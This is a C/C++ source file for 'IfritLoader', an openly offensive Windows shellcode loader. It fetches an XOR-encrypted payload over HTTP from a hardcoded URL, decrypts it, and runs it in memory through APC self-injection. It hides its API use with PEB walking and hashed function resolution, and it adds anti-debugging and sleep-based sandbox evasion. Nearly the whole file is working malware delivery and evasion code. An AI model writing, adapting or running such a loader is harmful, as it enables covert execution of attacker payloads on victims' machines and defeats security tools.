/**
 * Shellcode Loader for Donut Shellcode
 * Loads and executes shellcode from a local file or URL
 * Supports XOR-encrypted shellcode
 *
 * Usage:
 *   loader.exe /p:http://example.com/FILETOLOAD [/x:XOR_KEY]
 */
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <winhttp.h>
#include <stdio.h>

#include "IfritLoader_Hardcoded.h"


 // Maximum size for shellcode (20MB)
#define MAX_SHELLCODE_SIZE (20 * 1024 * 1024)
// Maximum URL length
#define MAX_URL_LENGTH 2048
// Maximum file path length
#define MAX_PATH_LENGTH 256
// Maximum XOR key length
#define MAX_XOR_KEY_LENGTH 256
// Maximum DOTNET length
#define MAX_XOR_KEY_LENGTH 256
// Seed for hash generation
#define SEED 5


// Generate a random key (used as initial hash)
constexpr int RandomCompileTimeSeed(void) {
    return '0' * -40271 +
        __TIME__[7] * 1 +
        __TIME__[6] * 10 +
        __TIME__[4] * 60 +
        __TIME__[3] * 600 +
        __TIME__[1] * 3600 +
        __TIME__[0] * 36000;
};

constexpr auto g_KEY = RandomCompileTimeSeed() % 0xFF;

// Compile time Djb2 hashing function (WIDE)
static constexpr DWORD HashStringDjb2W(const wchar_t* String) {
    ULONG Hash = (ULONG)g_KEY;
    INT c = 0;
    while ((c = *String++)) {
        Hash = ((Hash << SEED) + Hash) + c;
    }

    return Hash;
}

// Compile time Djb2 hashing function (ASCII)
static constexpr DWORD HashStringDjb2A(const char* String) {
    ULONG Hash = (ULONG)g_KEY;
    INT c = 0;
    while ((c = *String++)) {
        Hash = ((Hash << SEED) + Hash) + c;
    }

    return Hash;
}


// Runtime hashing macros 
#define RTIME_HASHA( API ) HashStringDjb2A((const char*) API)
#define RTIME_HASHW( API ) HashStringDjb2W((const wchar_t*) API)


// Compile time hashing macros (used to create variables)
#define CTIME_HASHA( API ) constexpr DWORD API##_Rotr32A = HashStringDjb2A((const char*) #API);
#define CTIME_HASHW( API ) constexpr DWORD API##_Rotr32W = HashStringDjb2W((const wchar_t*) L#API);


// Create hashes at compile time to be used later for dynamic resolution
CTIME_HASHW(WinHttpOpen);
CTIME_HASHW(WinHttpConnect);
CTIME_HASHW(WinHttpOpenRequest);
CTIME_HASHW(WinHttpSendRequest);
CTIME_HASHW(WinHttpReceiveResponse);
CTIME_HASHW(WinHttpReadData);
CTIME_HASHW(WinHttpCloseHandle);
CTIME_HASHW(WinHttpCrackUrl);

CTIME_HASHW(NtAllocateVirtualMemory);
CTIME_HASHW(NtProtectVirtualMemory);
CTIME_HASHW(NtTestAlert);
CTIME_HASHW(NtQueueApcThread);

CTIME_HASHW(LdrLoadDll);
CTIME_HASHW(LdrUnloadDll);


#pragma region PEB Walking
PPEB GetPEB() {
#ifdef _WIN64
    return (PPEB)__readgsqword(0x60);
#else
    return (PPEB)__readfsdword(0x30);
#endif
}

/**
 * Finds a module by name in PEB, searching BACKWARD (tail to head)
 *
 * @param moduleName Name of module to find (case-insensitive)
 * @return Base address of module if found, NULL otherwise
 */
static HMODULE GetModuleHandlePEB_Reverse(LPCWSTR moduleName) {
    PPEB peb = GetPEB();
    PPEB_LDR_DATA ldr = peb->Ldr;
    PLIST_ENTRY list = ldr->InMemoryOrderModuleList.Blink; // Start from TAIL

    printf("[+] Reverse-searching for module: %ls\n", moduleName);

    while (list != &ldr->InMemoryOrderModuleList) {
        PLDR_DATA_TABLE_ENTRY entry = CONTAINING_RECORD(list, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);

        __try {
            if (entry->BaseDllName.Buffer) {
                printf("  Checking: %wZ\n", &entry->BaseDllName);

                if (_wcsicmp(entry->BaseDllName.Buffer, moduleName) == 0) {
                    printf("[+] Found module at 0x%p\n", entry->DllBase);
                    return (HMODULE)entry->DllBase;
                }
            }
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {
            printf("[!] Error reading module name\n");
        }

        list = list->Blink; // Move backward
    }

    printf("[-] Module not found in PEB\n");
    return NULL;
}

/**
 * Retrieves a function address by parsing PE export tables manually
 *
 * @param hModule  Handle to the module containing the function
 * @param funcApiHash Hash of the name of the function to find
 * @return FARPROC address of the function, NULL if not found
 * @note Performs manual PE parsing to avoid using GetProcAddress
 */
static FARPROC GetProcAddressH(HMODULE hModule, DWORD funcApiHash) {

    PBYTE pBase = (PBYTE)hModule;

    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)pBase;
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) return NULL;

    PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)(pBase + dosHeader->e_lfanew);
    if (ntHeader->Signature != IMAGE_NT_SIGNATURE) return NULL;

    IMAGE_OPTIONAL_HEADER ImgOptHdr = ntHeader->OptionalHeader;

    PIMAGE_EXPORT_DIRECTORY exportDir = (PIMAGE_EXPORT_DIRECTORY)(pBase + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    PDWORD FunctionNameArray = (PDWORD)(pBase + exportDir->AddressOfNames);
    PDWORD FunctionAddressArray = (PDWORD)(pBase + exportDir->AddressOfFunctions);
    PWORD FunctionOrdinalArray = (PWORD)(pBase + exportDir->AddressOfNameOrdinals);

    for (DWORD i = 0; i < exportDir->NumberOfFunctions; i++) {
        CHAR* pFunctionName = (CHAR*)(pBase + FunctionNameArray[i]);
        PVOID pFunctionAddress = (PVOID)(pBase + FunctionAddressArray[FunctionOrdinalArray[i]]);

        if (funcApiHash == RTIME_HASHA(pFunctionName)) { // runtime hash value check 
            return (FARPROC)pFunctionAddress;
        }
    }

    return NULL;
}
#pragma endregion

/**
 * Download shellcode from a URL using WinHTTP
 *
 * @param base address of ntdll for dynamic function loading
 * @param url The URL to download from
 * @param shellcode Pointer to buffer where shellcode will be stored
 * @param shellcodeSize Pointer to variable that will store the size of the shellcode
 * @return TRUE if download successful, FALSE otherwise
 */
static BOOL DownloadShellcode(HMODULE ntbaseAddr, const char* url, PBYTE shellcode, DWORD* shellcodeSize) {
    pLdrLoadDll ptrLdrLoadDll = NULL;
    pLdrUnloadDll ptrLdrUnloadDll = NULL;

    // Converting the string to a unicode string manually since it's only done here
    UNICODE_STRING uDllName;
    uDllName.Buffer = (PWSTR)L"winhttp.dll";
    uDllName.Length = (USHORT)(wcslen(uDllName.Buffer) * sizeof(WCHAR));
    uDllName.MaximumLength = uDllName.Length + sizeof(WCHAR);

    ptrLdrLoadDll = (pLdrLoadDll)GetProcAddressH(ntbaseAddr, LdrLoadDll_Rotr32W);
    ptrLdrUnloadDll = (pLdrUnloadDll)GetProcAddressH(ntbaseAddr, LdrUnloadDll_Rotr32W);

    HMODULE hWinHttp = NULL;
    ptrLdrLoadDll(NULL, 0, &uDllName, &hWinHttp);
    if (!hWinHttp) {
        printf("[-] Failed to load winhttp.dll: %d\n", GetLastError());
        return FALSE;
    }

    // Dynamically resolve all necessary WinHTTP functions
    printf("[!] Resolving WinHttp functions...\n");
    pWinHttpOpen ptrWinHttpOpen = (pWinHttpOpen)GetProcAddressH(hWinHttp, WinHttpOpen_Rotr32W);
    if (!ptrWinHttpOpen) {
        printf("[-] Failed to resolve ptrWinHttpOpen\n");
    }
    pWinHttpConnect ptrWinHttpConnect = (pWinHttpConnect)GetProcAddressH(hWinHttp, WinHttpConnect_Rotr32W);
    if (!ptrWinHttpConnect) {
        printf("[-] Failed to resolve ptrWinHttpConnect\n");
    }
    pWinHttpOpenRequest ptrWinHttpOpenRequest = (pWinHttpOpenRequest)GetProcAddressH(hWinHttp, WinHttpOpenRequest_Rotr32W);
    if (!ptrWinHttpOpenRequest) {
        printf("[-] Failed to resolve ptrWinHttpOpenRequest\n");
    }
    pWinHttpSendRequest ptrWinHttpSendRequest = (pWinHttpSendRequest)GetProcAddressH(hWinHttp, WinHttpSendRequest_Rotr32W);
    if (!ptrWinHttpSendRequest) {
        printf("[-] Failed to resolve ptrWinHttpSendRequest\n");
    }
    pWinHttpReceiveResponse ptrWinHttpReceiveResponse = (pWinHttpReceiveResponse)GetProcAddressH(hWinHttp, WinHttpReceiveResponse_Rotr32W);
    if (!ptrWinHttpReceiveResponse) {
        printf("[-] Failed to resolve ptrWinHttpReceiveResponse\n");
    }
    pWinHttpReadData ptrWinHttpReadData = (pWinHttpReadData)GetProcAddressH(hWinHttp, WinHttpReadData_Rotr32W);
    if (!ptrWinHttpReadData) {
        printf("[-] Failed to resolve ptrWinHttpReadData\n");
    }
    pWinHttpCloseHandle ptrWinHttpCloseHandle = (pWinHttpCloseHandle)GetProcAddressH(hWinHttp, WinHttpCloseHandle_Rotr32W);
    if (!ptrWinHttpCloseHandle) {
        printf("[-] Failed to resolve ptrWinHttpCloseHandle\n");
    }
    pWinHttpCrackUrl ptrWinHttpCrackUrl = (pWinHttpCrackUrl)GetProcAddressH(hWinHttp, WinHttpCrackUrl_Rotr32W);
    if (!ptrWinHttpCrackUrl) {
        printf("[-] Failed to resolve ptrWinHttpCrackUrl\n");
    }

    if (!ptrWinHttpOpen || !ptrWinHttpConnect || !ptrWinHttpOpenRequest || !ptrWinHttpSendRequest ||
        !ptrWinHttpReceiveResponse || !ptrWinHttpReadData || !ptrWinHttpCloseHandle || !ptrWinHttpCrackUrl) {
        printf("[-] Failed to resolve one or more WinHTTP functions\n");
        ptrLdrUnloadDll(hWinHttp);
        return FALSE;
    }
    printf("[!] Functions resolved...\n");

    BOOL result = FALSE;
    HINTERNET hSession = NULL;
    HINTERNET hConnect = NULL;
    HINTERNET hRequest = NULL;
    URL_COMPONENTS urlComp = { 0 };
    WCHAR hostName[256] = { 0 };
    WCHAR urlPath[1024] = { 0 };
    DWORD bytesRead = 0;
    DWORD totalBytesRead = 0;
    LPCWSTR httpVerb = L"GET";
    DWORD flags = WINHTTP_FLAG_REFRESH;

    // Convert ANSI URL to wide string
    int urlLen = (int)strlen(url) + 1;
    WCHAR wUrl[2084] = { 0 };
    if (MultiByteToWideChar(CP_ACP, 0, url, urlLen, wUrl, 2084) == 0) {
        ptrLdrUnloadDll(hWinHttp);
        return FALSE;
    }

    // Setup URL components
    urlComp.dwStructSize = sizeof(urlComp);
    urlComp.lpszHostName = hostName;
    urlComp.dwHostNameLength = sizeof(hostName) / sizeof(WCHAR);
    urlComp.lpszUrlPath = urlPath;
    urlComp.dwUrlPathLength = sizeof(urlPath) / sizeof(WCHAR);

    // Crack the URL into components
    if (!ptrWinHttpCrackUrl(wUrl, 0, 0, &urlComp)) {
        ptrLdrUnloadDll(hWinHttp);
        return FALSE;
    }

    // Initialize WinHTTP session
    hSession = ptrWinHttpOpen(L"IfritLoader/1.0", WINHTTP_ACCESS_TYPE_NO_PROXY, NULL, NULL, 0);
    if (hSession == NULL) {
        ptrLdrUnloadDll(hWinHttp);
        return FALSE;
    }

    // Connect to the host
    hConnect = ptrWinHttpConnect(hSession, urlComp.lpszHostName, urlComp.nPort, 0);
    if (hConnect == NULL) {
        goto cleanup;
    }

    // Determine HTTP method and flags
    if (urlComp.nScheme == INTERNET_SCHEME_HTTPS) {
        flags |= WINHTTP_FLAG_SECURE;
    }

    // Open the request
    hRequest = ptrWinHttpOpenRequest(hConnect, httpVerb, urlComp.lpszUrlPath, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, flags);
    if (hRequest == NULL) {
        goto cleanup;
    }

    // Send the request
    if (!ptrWinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0)) {
        goto cleanup;
    }

    // Receive response
    if (!ptrWinHttpReceiveResponse(hRequest, NULL)) {
        goto cleanup;
    }

    // Read the response body
    while (totalBytesRead < MAX_SHELLCODE_SIZE) {
        if (!ptrWinHttpReadData(hRequest, shellcode + totalBytesRead, MAX_SHELLCODE_SIZE - totalBytesRead, &bytesRead)) {
            goto cleanup;
        }

        if (bytesRead == 0) {
            result = TRUE;
            break;
        }

        totalBytesRead += bytesRead;
    }

    if (totalBytesRead >= MAX_SHELLCODE_SIZE) {
        goto cleanup;
    }

    *shellcodeSize = totalBytesRead;
    printf("[+] Downloaded %d bytes from %s\n", totalBytesRead, url);

cleanup:
    if (hRequest) ptrWinHttpCloseHandle(hRequest);
    if (hConnect) ptrWinHttpCloseHandle(hConnect);
    if (hSession) ptrWinHttpCloseHandle(hSession);
    ptrLdrUnloadDll(hWinHttp);

    return result;
}

/**
 * XOR decrypt the shellcode
 *
 * @param shellcode The shellcode to decrypt
 * @param shellcodeSize Size of the shellcode
 * @param key The XOR key
 * @return TRUE if decryption successful, FALSE otherwise
 */
static BOOL XorDecryptShellcode(PBYTE shellcode, DWORD shellcodeSize, const char* key) {
    DWORD i = 0;
    size_t keyLength = 0;

    keyLength = strlen(key);
    if (keyLength == 0) {
        printf("[-] Invalid XOR key: empty key\n");
        return FALSE;
    }

    printf("[+] Decrypting shellcode with XOR key...\n");

    // XOR each byte with the corresponding byte from the key
    for (i = 0; i < shellcodeSize; i++) {
        shellcode[i] = shellcode[i] ^ key[i % keyLength];
    }

    return TRUE;
}

/**
 * Inline APC Injection to trigger shellcode with alert.
 *
 * @param Base address of ntdll for dynamic resolution
 * @param Shellcode to execute
 * @param Size of the shellcode to execute
 * @return TRUE if decryption successful, FALSE otherwise
 */
static BOOL APCSelfInjection(HMODULE ntbaseAddr, PBYTE shellcode, SIZE_T size) {
    BOOL result = FALSE;
    pNtTestAlert ptrNtTestAlert = NULL;
    pNtQueueApcThread ptrNtQueueApcThread = NULL;
    pNtAllocateVirtualMemory ptrNtAllocateVirtualMemory = NULL;
    pNtProtectVirtualMemory ptrNtProtectVirtualMemory = NULL;
    PVOID execMem = NULL;
    NTSTATUS status;
    ULONG oldProtect;

    ptrNtQueueApcThread = (pNtQueueApcThread)GetProcAddressH(ntbaseAddr, NtQueueApcThread_Rotr32W);
    if (!ptrNtQueueApcThread) {
        printf("[-] Issue with QueueApc\n");
        return FALSE;
    }

    ptrNtAllocateVirtualMemory = (pNtAllocateVirtualMemory)GetProcAddressH(ntbaseAddr, NtAllocateVirtualMemory_Rotr32W);
    ptrNtProtectVirtualMemory = (pNtProtectVirtualMemory)GetProcAddressH(ntbaseAddr, NtProtectVirtualMemory_Rotr32W);

    status = ptrNtAllocateVirtualMemory(
        NtCurrentProcess(),
        &execMem,
        0,
        &size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE  // Initially allocate as RW
    );
    if (STATUS_SUCCESS != status || !execMem) {
        printf("[-] AVM failed: 0x%X\n", status);
        return FALSE;
    }
    memcpy(execMem, shellcode, size);

    status = ptrNtProtectVirtualMemory(
        NtCurrentProcess(),
        &execMem,
        &size,
        PAGE_EXECUTE_READ,
        &oldProtect
    );

    if (STATUS_SUCCESS != status) {
        printf("[-] PVM failed: 0x%X\n", status);
        return FALSE;
    }

    // Force APC execution
    printf("[+] Executing shellcode...\n");
    ptrNtQueueApcThread(NtCurrentThread(), execMem, NULL, NULL, NULL);
    ptrNtTestAlert = (pNtTestAlert)GetProcAddressH(ntbaseAddr, NtTestAlert_Rotr32W);
    if (!ptrNtTestAlert()) {
        printf("[-] Issue with TestAlert\n");
        return FALSE;
    }
    return TRUE;
}


/**
 * Main function
 *
 * @param argc Number of command line arguments
 * @param argv Array of command line arguments
 * @return 0 if successful, non-zero otherwise
 */
int main(int argc, char* argv[]) {
    BYTE* shellcode = NULL;
    DWORD shellcodeSize = 0;
    char path[MAX_URL_LENGTH] = { 0 };
    char xorKey[MAX_XOR_KEY_LENGTH] = { 0 };
    BOOL result = FALSE;

    // Don't run if debugger attached
    if (IsDebuggerPresent()) {
        printf("[-] Cheating Tool Detected!\n");
        return 1;
    }

    // Simple sandbox evasion
    DWORD64 start = GetTickCount64();
    Sleep(5000);
    DWORD64 end = GetTickCount64();
    if ((end - start) < 4500) {
        printf("[-] Cheating Tool Detected!\n");
        return 1;
    }

    // Find Ntdll to use as the base address
    HMODULE ntbaseAddr = NULL;
    ntbaseAddr = GetModuleHandlePEB_Reverse(L"ntdll.dll");

    // Allocate shellcode buffer on heap instead of stack to prevent stack overflow
    shellcode = (BYTE*)malloc(MAX_SHELLCODE_SIZE);
    if (shellcode == NULL) {
        printf("[-] Failed to allocate memory for shellcode\n");
        return 1;
    }

    // Zero the memory
    memset(shellcode, 0, MAX_SHELLCODE_SIZE);

    // Download the shellcode
    result = DownloadShellcode(ntbaseAddr, "http://127.0.0.1:22/http.bin", shellcode, &shellcodeSize);
    if (!result || shellcodeSize == 0) {
        printf("[-] Failed to load shellcode\n");
        free(shellcode);
        return 1;
    }

    // Change the xor key
    if (!XorDecryptShellcode(shellcode, shellcodeSize, "Hi")) {
        printf("[-] Failed to decrypt shellcode\n");
        free(shellcode);
        return 1;
    }

    // Execute the shellcode
    //printf("[!] Attempting to execute shellcode\n");
    result = APCSelfInjection(ntbaseAddr, shellcode, shellcodeSize);
    if (!result) {
        printf("[-] Failed to execute shellcode\n");
        free(shellcode);
        return 1;
    }

    return 0;
}
